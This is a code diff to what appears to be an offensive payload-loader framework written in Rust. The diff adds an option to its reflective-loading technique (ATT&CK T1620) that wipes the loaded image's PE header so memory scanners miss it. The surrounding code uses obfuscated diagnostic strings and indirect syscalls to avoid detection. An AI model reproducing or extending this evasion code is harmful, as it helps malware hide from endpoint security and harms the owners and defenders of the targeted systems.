@@ -21,15 +21,24 @@ pub struct Params {
     /// declares exactly one payload.
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub payload: Option<String>,
+
+    /// Zero the mapped image's PE header (`SizeOfHeaders` bytes at its base)
+    /// after the loader's fixups and before any payload code runs, so a memory
+    /// scan does not find an `MZ`/`PE` pair at the mapped base.
+    ///
+    /// Off by default: payload startup code that reads its own PE header (e.g.
+    /// the MSVC CRT's `__scrt_get_show_window_mode`) can break. Only applies to
+    /// `pe`/`dll` payloads; a `shellcode` payload has no mapped image.
+    #[serde(default)]
+    pub erase_header: bool,
 }
 
 /// Static metadata for reflective loading.
 pub const DEF: TechniqueDef = TechniqueDef {
     name: "reflective_loading",
     attck: &["T1620"],
-    // Measured widely (e2e marker + exit code on x64/x86, the payload-TLS
-    // provisioning record, every probe-based test). Not `Stable` because a
-    // payload that raises a native exception cannot unwind on x64 — the mapped
+    // Measured widely (e2e marker + exit code on x64/x86). Not `Stable` because
+    // a payload that raises a native exception cannot unwind on x64 — the mapped
     // image's unwind tables are not registered (README).
     stability: Stability::Experimental,
     requires: &[Capability::WindowsX64, Capability::WindowsX86],
@@ -43,7 +52,7 @@ pub const DEF: TechniqueDef = TechniqueDef {
         super::PayloadFormat::Shellcode,
     ],
     requires_indirect_syscalls: false,
-    params_example: "technique: reflective_loading\n",
+    params_example: "technique: reflective_loading\nparams:\n  erase_header: false\n",
     readme: include_str!("README.md"),
     // Allocation and page protection go through the syscall layer
     // (`nt_alloc_vm`/`nt_protect_vm`), so `mode: indirect` removes the
@@ -81,10 +90,6 @@ const MESSAGES: &[(&str, &str)] = &[
     (
         "$MSG_VIRTUAL_PROTECT_FAILED$",
         "could not change protection for a section",
-    ),
-    (
-        "$MSG_TLS_UNAVAILABLE$",
-        "could not provision the payload's TLS (no index or no memory)",
     ),
     (
         "$MSG_EXPORT_NOT_FOUND$",
@@ -132,17 +137,23 @@ fn substitute(
 }
 
 impl Params {
-    /// Renders the reflective-loading stub fragment (no per-build parameters,
-    /// so `strings` only feeds the obfuscated diagnostics).
+    /// Renders the reflective-loading stub fragment.
+    ///
+    /// The only per-build value is [`Params::erase_header`] (a `true`/`false`
+    /// constant in the fragment); `strings` feeds the obfuscated diagnostics.
     pub fn render_fragment(&self, strings: &StringsConfig) -> String {
-        substitute(DEF.stub_fragment.to_string(), MESSAGES, strings, "pe_msg_")
+        substitute(DEF.stub_fragment.to_string(), MESSAGES, strings, "pe_msg_").replace(
+            "$ERASE_HEADER$",
+            if self.erase_header { "true" } else { "false" },
+        )
     }
 
     /// Renders the fragment that matches the payload's binary format.
     ///
     /// `pe` and `dll` share the PE mapper; a DLL may additionally name an
     /// export to call (`build.payloads.<name>.export`, obfuscated through `strings`). A
-    /// `shellcode` payload gets the raw-code runner instead.
+    /// `shellcode` payload gets the raw-code runner instead — it has no mapped
+    /// image, so [`Params::erase_header`] does not apply to it.
     pub fn render_fragment_for(
         &self,
         strings: &StringsConfig,
